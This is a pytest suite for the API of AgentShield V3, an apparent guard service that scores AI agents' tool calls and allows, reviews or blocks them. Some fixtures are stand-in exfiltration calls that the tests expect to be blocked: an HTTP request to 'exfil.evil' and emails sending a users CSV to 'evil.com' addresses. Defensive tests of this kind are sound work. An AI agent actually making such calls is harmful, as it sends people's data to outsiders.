"""
AgentShield V3 API Route Tests
================================
Tests for the FastAPI endpoints using httpx.AsyncClient (mock-based).
Covers all routes defined in backend/app/main.py and backend/app.py.
"""

import sys
from pathlib import Path
from unittest.mock import patch

import pytest

# Ensure backend is on sys.path
_CURRENT_DIR = Path(__file__).parent.resolve()
_BACKEND_DIR = _CURRENT_DIR.parent
if str(_BACKEND_DIR) not in sys.path:
    sys.path.insert(0, str(_BACKEND_DIR))


def _make_risk_state(combined_risk_target: float):
    """Create a GraphRiskState that produces approximately the target combined_risk.

    With all components equal to x and confidence=1.0, combined_risk = x.
    """
    from app.shield.risk_signals import GraphRiskState
    return GraphRiskState(
        local_risk=combined_risk_target,
        inherited_risk=combined_risk_target,
        downstream_exposure=combined_risk_target,
        path_risk=combined_risk_target,
        intervention_value=combined_risk_target,
        confidence=1.0,
    )


# ─── Fixtures ────────────────────────────────────────────────────────────────

@pytest.fixture
def main_app():
    """The /api/v3/* FastAPI app (main.py)."""
    from app.main import app
    return app


@pytest.fixture
def standalone_app():
    """The standalone FastAPI app (app.py, port 8090)."""
    import importlib.util
    app_py = Path(__file__).resolve().parents[1] / "app.py"
    spec = importlib.util.spec_from_file_location("app_standalone", str(app_py))
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    sys.modules["app_standalone"] = mod
    return mod.app


@pytest.fixture
def anyio_backend():
    return "asyncio"


# ─── /api/v3/* routes (main.py) ─────────────────────────────────────────────

class TestV3RoutesMain:
    """Tests for the /api/v3/ router registered in main.py."""

    @pytest.mark.anyio
    async def test_health_endpoint(self, main_app):
        from httpx import ASGITransport, AsyncClient
        transport = ASGITransport(app=main_app)
        async with AsyncClient(transport=transport, base_url="http://test") as client:
            resp = await client.get("/health")
        assert resp.status_code == 200
        body = resp.json()
        assert body["status"] == "ok"
        assert body["version"] == "3.0.0"
        assert "engine" in body

    @pytest.mark.anyio
    async def test_root_endpoint(self, main_app):
        from httpx import ASGITransport, AsyncClient
        transport = ASGITransport(app=main_app)
        async with AsyncClient(transport=transport, base_url="http://test") as client:
            resp = await client.get("/")
        assert resp.status_code == 200
        body = resp.json()
        assert "endpoints" in body
        assert "process_call" in body["endpoints"]

    @pytest.mark.anyio
    async def test_process_call_low_risk(self, main_app):
        from httpx import ASGITransport, AsyncClient
        transport = ASGITransport(app=main_app)
        async with AsyncClient(transport=transport, base_url="http://test") as client:
            resp = await client.post("/api/v3/process_call", json={
                "agent_id": "test_agent",
                "tool_name": "read_file",
                "params": {"path": "/tmp/data.txt"},
                "risk_score": 0.2,
                "fuse_action": "allow",
                "session_id": "route_test_001",
            })
        assert resp.status_code == 200
        body = resp.json()
        assert body["decision"] == "allow"
        assert body["risk_level"] == "low"
        assert "node_id" in body
        assert "call_id" in body
        assert "behavior_graph_summary" in body

    @pytest.mark.anyio
    async def test_process_call_high_risk_blocks(self, main_app):
        from httpx import ASGITransport, AsyncClient
        transport = ASGITransport(app=main_app)
        # Mock risk computation to produce high computed risk so the
        # blended final_risk reaches the BLOCK threshold
        with patch(
            'app.shield.risk_extractor.RiskSignalExtractor.compute_graph_risk_state',
            return_value=_make_risk_state(0.9),
        ):
            async with AsyncClient(transport=transport, base_url="http://test") as client:
                resp = await client.post("/api/v3/process_call", json={
                    "agent_id": "attacker",
                    "tool_name": "send_email",
                    "params": {"to": "evil@external.com"},
                    "risk_score": 0.95,
                    "fuse_action": "block",
                    "session_id": "route_test_002",
                })
        assert resp.status_code == 200
        body = resp.json()
        assert body["decision"] == "block"
        assert body["risk_level"] == "critical"
        assert body["gate_result"]["action"] == "BLOCK"

    @pytest.mark.anyio
    async def test_process_call_medium_risk_triggers_review(self, main_app):
        from httpx import ASGITransport, AsyncClient
        transport = ASGITransport(app=main_app)
        # Mock risk computation to produce medium computed risk so the
        # blended final_risk falls in the HUMAN_REVIEW range
        with patch(
            'app.shield.risk_extractor.RiskSignalExtractor.compute_graph_risk_state',
            return_value=_make_risk_state(0.8),
        ):
            async with AsyncClient(transport=transport, base_url="http://test") as client:
                resp = await client.post("/api/v3/process_call", json={
                    "agent_id": "review_agent",
                    "tool_name": "cursor.execute",
                    "params": {"sql": "SELECT * FROM orders"},
                    "risk_score": 0.75,
                    "fuse_action": "allow",
                    "session_id": "route_test_003",
                })
        assert resp.status_code == 200
        body = resp.json()
        assert body["decision"] == "review"
        assert body["gate_result"]["action"] == "HUMAN_REVIEW"

    @pytest.mark.anyio
    async def test_process_call_generates_future_branches(self, main_app):
        from httpx import ASGITransport, AsyncClient
        transport = ASGITransport(app=main_app)
        # Mock risk computation to produce high computed risk so branches are generated
        with patch(
            'app.shield.risk_extractor.RiskSignalExtractor.compute_graph_risk_state',
            return_value=_make_risk_state(0.85),
        ):
            async with AsyncClient(transport=transport, base_url="http://test") as client:
                resp = await client.post("/api/v3/process_call", json={
                    "agent_id": "branch_agent",
                    "tool_name": "send_email",
                    "params": {"to": "test@example.com"},
                    "risk_score": 0.80,
                    "fuse_action": "allow",
                    "session_id": "route_test_004",
                })
        assert resp.status_code == 200
        body = resp.json()
        # High risk should trigger future branches
        assert len(body["future_branches"]) > 0

    @pytest.mark.anyio
    async def test_process_call_whatif_on_high_risk(self, main_app):
        from httpx import ASGITransport, AsyncClient
        transport = ASGITransport(app=main_app)
        # Mock risk computation to produce high computed risk so whatif is triggered
        with patch(
            'app.shield.risk_extractor.RiskSignalExtractor.compute_graph_risk_state',
            return_value=_make_risk_state(0.9),
        ):
            async with AsyncClient(transport=transport, base_url="http://test") as client:
                resp = await client.post("/api/v3/process_call", json={
                    "agent_id": "whatif_agent",
                    "tool_name": "http_request",
                    "params": {"url": "https://exfil.evil/data"},
                    "risk_score": 0.92,
                    "fuse_action": "block",
                    "session_id": "route_test_005",
                })
        assert resp.status_code == 200
        body = resp.json()
        assert body["whatif_result"] is not None
        assert "scenario_id" in body["whatif_result"]
        assert body["whatif_result"]["risk_delta"] < 0

    @pytest.mark.anyio
    async def test_get_status_returns_governance_info(self, main_app):
        from httpx import ASGITransport, AsyncClient
        transport = ASGITransport(app=main_app)
        async with AsyncClient(transport=transport, base_url="http://test") as client:
            # First create a session
            await client.post("/api/v3/process_call", json={
                "agent_id": "status_agent",
                "tool_name": "cursor.execute",
                "params": {"sql": "SELECT 1"},
                "risk_score": 0.3,
                "fuse_action": "allow",
                "session_id": "route_test_status",
            })
            resp = await client.get("/api/v3/status/route_test_status")
        assert resp.status_code == 200
        body = resp.json()
        assert body["session_id"] == "route_test_status"
        assert "behavior_graph" in body
        assert "branch_count" in body

    @pytest.mark.anyio
    async def test_get_status_404_for_unknown_session(self, main_app):
        from httpx import ASGITransport, AsyncClient
        transport = ASGITransport(app=main_app)
        async with AsyncClient(transport=transport, base_url="http://test") as client:
            resp = await client.get("/api/v3/status/nonexistent_session_xyz")
        assert resp.status_code == 404

    @pytest.mark.anyio
    async def test_fork_branch_creates_intervention(self, main_app):
        from httpx import ASGITransport, AsyncClient
        transport = ASGITransport(app=main_app)
        async with AsyncClient(transport=transport, base_url="http://test") as client:
            # Create session first
            await client.post("/api/v3/process_call", json={
                "agent_id": "fork_agent",
                "tool_name": "cursor.execute",
                "params": {"sql": "SELECT 1"},
                "risk_score": 0.3,
                "fuse_action": "allow",
                "session_id": "route_test_fork",
            })
            resp = await client.post("/api/v3/fork_branch", json={
                "branch_label": "manual_intervention_test",
                "intervention": {"type": "block_tool_call", "tool_name": "send_email"},
                "session_id": "route_test_fork",
            })
        assert resp.status_code == 200
        body = resp.json()
        assert "branch_id" in body
        assert body["session_id"] == "route_test_fork"

    @pytest.mark.anyio
    async def test_export_chain_returns_full_data(self, main_app):
        from httpx import ASGITransport, AsyncClient
        transport = ASGITransport(app=main_app)
        async with AsyncClient(transport=transport, base_url="http://test") as client:
            await client.post("/api/v3/process_call", json={
                "agent_id": "export_agent",
                "tool_name": "http_request",
                "params": {"url": "https://api.example.com"},
                "risk_score": 0.5,
                "fuse_action": "allow",
                "session_id": "route_test_export",
            })
            resp = await client.get("/api/v3/export_chain/route_test_export")
        assert resp.status_code == 200
        body = resp.json()
        assert "behavior_graph" in body
        assert "branch_tree" in body
        assert "audit_chain" in body

    @pytest.mark.anyio
    async def test_export_chain_404_for_unknown(self, main_app):
        from httpx import ASGITransport, AsyncClient
        transport = ASGITransport(app=main_app)
        async with AsyncClient(transport=transport, base_url="http://test") as client:
            resp = await client.get("/api/v3/export_chain/nonexistent_xyz")
        assert resp.status_code == 404

    @pytest.mark.anyio
    async def test_behavior_graph_endpoint(self, main_app):
        from httpx import ASGITransport, AsyncClient
        transport = ASGITransport(app=main_app)
        async with AsyncClient(transport=transport, base_url="http://test") as client:
            await client.post("/api/v3/process_call", json={
                "agent_id": "graph_agent",
                "tool_name": "cursor.execute",
                "params": {"sql": "SELECT 1"},
                "risk_score": 0.4,
                "fuse_action": "allow",
                "session_id": "route_test_graph",
            })
            resp = await client.get("/api/v3/behavior_graph/route_test_graph")
        assert resp.status_code == 200
        body = resp.json()
        assert "nodes" in body
        assert "edges" in body
        assert len(body["nodes"]) >= 1

    @pytest.mark.anyio
    async def test_simulate_steps(self, main_app):
        from httpx import ASGITransport, AsyncClient
        transport = ASGITransport(app=main_app)
        async with AsyncClient(transport=transport, base_url="http://test") as client:
            await client.post("/api/v3/process_call", json={
                "agent_id": "sim_agent",
                "tool_name": "cursor.execute",
                "params": {"sql": "SELECT 1"},
                "risk_score": 0.3,
                "fuse_action": "allow",
                "session_id": "route_test_sim",
            })
            resp = await client.post(
                "/api/v3/simulate_steps",
                params={"session_id": "route_test_sim", "steps": 3},
            )
        assert resp.status_code == 200
        body = resp.json()
        assert body["steps_run"] == 3
        assert "behavior_graph" in body


# ─── Standalone app routes (app.py, port 8090) ──────────────────────────────

class TestStandaloneAppRoutes:
    """Tests for the standalone app.py endpoints."""

    @pytest.mark.anyio
    async def test_standalone_health(self, standalone_app):
        from httpx import ASGITransport, AsyncClient
        transport = ASGITransport(app=standalone_app)
        async with AsyncClient(transport=transport, base_url="http://test") as client:
            resp = await client.get("/health")
        assert resp.status_code == 200
        body = resp.json()
        assert body["status"] == "ok"
        assert body["port"] == 8011

    @pytest.mark.anyio
    async def test_evaluate_endpoint(self, standalone_app):
        from httpx import ASGITransport, AsyncClient
        transport = ASGITransport(app=standalone_app)
        async with AsyncClient(transport=transport, base_url="http://test") as client:
            resp = await client.post("/api/evaluate", json={
                "agent_id": "standalone_agent",
                "tool_name": "read_file",
                "params": {"path": "/tmp/test.txt"},
                "risk_score": 0.15,
                "session_id": "standalone_test_001",
            })
        assert resp.status_code == 200
        body = resp.json()
        assert "decision" in body
        assert "risk_level" in body
        assert "risk_score" in body
        assert "reasoning" in body
        assert body["shield_version"] == "3.0.0"

    @pytest.mark.anyio
    async def test_evaluate_auto_generates_session_id(self, standalone_app):
        from httpx import ASGITransport, AsyncClient
        transport = ASGITransport(app=standalone_app)
        async with AsyncClient(transport=transport, base_url="http://test") as client:
            resp = await client.post("/api/evaluate", json={
                "agent_id": "auto_session_agent",
                "tool_name": "cursor.execute",
                "params": {"sql": "SELECT 1"},
                "risk_score": 0.5,
            })
        assert resp.status_code == 200
        body = resp.json()
        assert body["session_id"]  # Should be auto-generated

    @pytest.mark.anyio
    async def test_agent_registry(self, standalone_app):
        from httpx import ASGITransport, AsyncClient
        transport = ASGITransport(app=standalone_app)
        async with AsyncClient(transport=transport, base_url="http://test") as client:
            resp = await client.get("/api/agent/registry")
        assert resp.status_code == 200
        body = resp.json()
        assert "agents" in body
        assert body["total"] > 0
        # Verify known agent types exist
        types = {a["type"] for a in body["agents"]}
        assert "Risk-Analysis" in types

    @pytest.mark.anyio
    async def test_behavior_chain_endpoint(self, standalone_app):
        from httpx import ASGITransport, AsyncClient
        transport = ASGITransport(app=standalone_app)
        async with AsyncClient(transport=transport, base_url="http://test") as client:
            resp = await client.post("/api/agent/behavior_chain", json={
                "agents": [
                    {"id": "agent_1", "action": "query", "target": "database", "input": {"sql": "SELECT *"}},
                    {"id": "agent_2", "action": "send_email", "target": "user@test.com", "input": {"body": "report"}},
                ]
            })
        assert resp.status_code == 200
        body = resp.json()
        assert "chain_id" in body
        assert len(body["steps"]) == 2
        assert "risk_score" in body
        assert "verdict" in body

    @pytest.mark.anyio
    async def test_evaluate_intent_endpoint(self, standalone_app):
        from httpx import ASGITransport, AsyncClient
        transport = ASGITransport(app=standalone_app)
        async with AsyncClient(transport=transport, base_url="http://test") as client:
            resp = await client.post("/api/agent/evaluate_intent", json={
                "agent_id": "intent_agent",
                "stated_goal": "查询数据库中的客户信息",
                "observed_actions": ["查询客户表", "分析数据"],
            })
        assert resp.status_code == 200
        body = resp.json()
        assert "intent_alignment" in body
        assert "deception_score" in body
        assert "reasoning" in body

    @pytest.mark.anyio
    async def test_evaluate_intent_no_actions(self, standalone_app):
        from httpx import ASGITransport, AsyncClient
        transport = ASGITransport(app=standalone_app)
        async with AsyncClient(transport=transport, base_url="http://test") as client:
            resp = await client.post("/api/agent/evaluate_intent", json={
                "agent_id": "empty_agent",
                "stated_goal": "test",
                "observed_actions": [],
            })
        assert resp.status_code == 200
        body = resp.json()
        assert body["intent_alignment"] == 0.5

    @pytest.mark.anyio
    async def test_sessions_list_endpoint(self, standalone_app):
        from httpx import ASGITransport, AsyncClient
        transport = ASGITransport(app=standalone_app)
        async with AsyncClient(transport=transport, base_url="http://test") as client:
            resp = await client.get("/api/sessions")
        assert resp.status_code == 200
        body = resp.json()
        assert "sessions" in body

    @pytest.mark.anyio
    async def test_health_detailed_endpoint(self, standalone_app):
        from httpx import ASGITransport, AsyncClient
        transport = ASGITransport(app=standalone_app)
        async with AsyncClient(transport=transport, base_url="http://test") as client:
            resp = await client.get("/api/health_detailed")
        assert resp.status_code == 200
        body = resp.json()
        assert body["status"] == "ok"
        assert "active_sessions" in body
        assert "db_file" in body

    @pytest.mark.anyio
    async def test_get_session_404(self, standalone_app):
        from httpx import ASGITransport, AsyncClient
        transport = ASGITransport(app=standalone_app)
        async with AsyncClient(transport=transport, base_url="http://test") as client:
            resp = await client.get("/api/session/nonexistent_session_xyz")
        assert resp.status_code == 404


# ─── Validation / Error Handling ─────────────────────────────────────────────

class TestValidation:
    """Test input validation and error handling."""

    @pytest.mark.anyio
    async def test_process_call_missing_required_fields(self, main_app):
        from httpx import ASGITransport, AsyncClient
        transport = ASGITransport(app=main_app)
        async with AsyncClient(transport=transport, base_url="http://test") as client:
            resp = await client.post("/api/v3/process_call", json={
                "agent_id": "test",
                # Missing tool_name, params, risk_score, fuse_action
            })
        assert resp.status_code == 422  # Pydantic validation error

    @pytest.mark.anyio
    async def test_evaluate_missing_agent_id(self, standalone_app):
        from httpx import ASGITransport, AsyncClient
        transport = ASGITransport(app=standalone_app)
        async with AsyncClient(transport=transport, base_url="http://test") as client:
            resp = await client.post("/api/evaluate", json={
                "tool_name": "test",
                "params": {},
            })
        assert resp.status_code == 422

    @pytest.mark.anyio
    async def test_process_call_risk_score_clamped(self, main_app):
        """Risk scores outside [0,1] should be clamped by the engine."""
        from httpx import ASGITransport, AsyncClient
        transport = ASGITransport(app=main_app)
        async with AsyncClient(transport=transport, base_url="http://test") as client:
            resp = await client.post("/api/v3/process_call", json={
                "agent_id": "clamp_agent",
                "tool_name": "cursor.execute",
                "params": {"sql": "SELECT 1"},
                "risk_score": 1.5,  # Over 1.0
                "fuse_action": "allow",
                "session_id": "clamp_test",
            })
        assert resp.status_code == 200
        body = resp.json()
        assert body["risk_score"] <= 1.0

    @pytest.mark.anyio
    async def test_process_call_negative_risk_clamped(self, main_app):
        from httpx import ASGITransport, AsyncClient
        transport = ASGITransport(app=main_app)
        async with AsyncClient(transport=transport, base_url="http://test") as client:
            resp = await client.post("/api/v3/process_call", json={
                "agent_id": "neg_agent",
                "tool_name": "read_file",
                "params": {"path": "/tmp"},
                "risk_score": -0.5,  # Below 0
                "fuse_action": "allow",
                "session_id": "neg_test",
            })
        assert resp.status_code == 200
        body = resp.json()
        assert body["risk_score"] >= 0.0


# ─── Multi-step Scenarios ────────────────────────────────────────────────────

class TestMultiStepScenarios:
    """Test realistic multi-step scenarios through the API."""

    @pytest.mark.anyio
    async def test_escalating_risk_chain(self, main_app):
        """Simulate a chain of tool calls with escalating risk."""
        from httpx import ASGITransport, AsyncClient
        transport = ASGITransport(app=main_app)
        session_id = "escalation_test"
        async with AsyncClient(transport=transport, base_url="http://test") as client:
            # Step 1: Low risk read
            r1 = await client.post("/api/v3/process_call", json={
                "agent_id": "escalation_agent",
                "tool_name": "cursor.execute",
                "params": {"sql": "SELECT name FROM users"},
                "risk_score": 0.2,
                "fuse_action": "allow",
                "session_id": session_id,
            })
            node1_id = r1.json()["node_id"]

            # Step 2: Medium risk - export
            r2 = await client.post("/api/v3/process_call", json={
                "agent_id": "escalation_agent",
                "tool_name": "export_csv",
                "params": {"table": "users"},
                "risk_score": 0.5,
                "fuse_action": "allow",
                "session_id": session_id,
                "parent_node_id": node1_id,
            })

            # Step 3: High risk - send email with data
            # Mock risk computation to produce high computed risk for the BLOCK decision
            with patch(
                'app.shield.risk_extractor.RiskSignalExtractor.compute_graph_risk_state',
                return_value=_make_risk_state(0.9),
            ):
                r3 = await client.post("/api/v3/process_call", json={
                    "agent_id": "escalation_agent",
                    "tool_name": "send_email",
                    "params": {"to": "external@evil.com", "attachment": "users.csv"},
                    "risk_score": 0.92,
                    "fuse_action": "block",
                    "session_id": session_id,
                    "parent_node_id": r2.json()["node_id"],
                })

            # Verify the chain
            status_resp = await client.get(f"/api/v3/status/{session_id}")
            assert status_resp.status_code == 200
            status = status_resp.json()
            assert status["behavior_graph"]["total_nodes"] == 3

            # Step 3 should be blocked
            assert r3.json()["decision"] == "block"

            # Export should show full chain
            export_resp = await client.get(f"/api/v3/export_chain/{session_id}")
            chain = export_resp.json()
            assert len(chain["audit_chain"]) >= 3

class TestAsyncSessionPersistence:
    """Session persistence must be non-blocking AND lossless.

    The save path debounces writes and runs sqlite3 on a thread pool so it
    never blocks the event loop.  The invariant under test: no matter how
    many requests arrive while a flush is in flight, the *final* persisted
    snapshot must contain every processed call.
    """

    @pytest.mark.anyio
    async def test_burst_of_calls_is_fully_persisted(self, standalone_app):
        from app.shield.session_store import load_session

        app_mod = sys.modules.get("app_standalone")
        if app_mod is None:
            for name, mod in list(sys.modules.items()):
                if getattr(mod, "__file__", "").endswith("app.py") and hasattr(mod, "app"):
                    app_mod = mod
                    break
        assert app_mod is not None

        session_id = "persist_burst_1"
        from app.shield import persistence

        persistence.reset()

        from httpx import ASGITransport, AsyncClient

        n_calls = 25
        async with AsyncClient(transport=ASGITransport(app=app_mod.app), base_url="http://t") as client:
            for i in range(n_calls):
                resp = await client.post(
                    "/api/evaluate",
                    json={
                        "agent_id": "a",
                        "tool_name": "cursor.execute",
                        "params": {"q": str(i)},
                        "risk_score": 0.75,
                        "session_id": session_id,
                    },
                )
                assert resp.status_code == 200

        # Drain the debounced write queue.
        from app.shield import persistence

        await persistence.drain_async()
        persistence.drain()

        saved = load_session(session_id)
        assert saved is not None
        # Every processed call must be in the persisted audit chain.
        assert len(saved["audit_data"]) >= n_calls
        assert len(saved["graph_data"]["nodes"]) >= n_calls

    @pytest.mark.anyio
    async def test_save_queue_drains_after_burst(self, standalone_app):
        from app.shield import persistence

        await persistence.drain_async()
        assert persistence.pending_count() == 0
        assert persistence.inflight_count() == 0
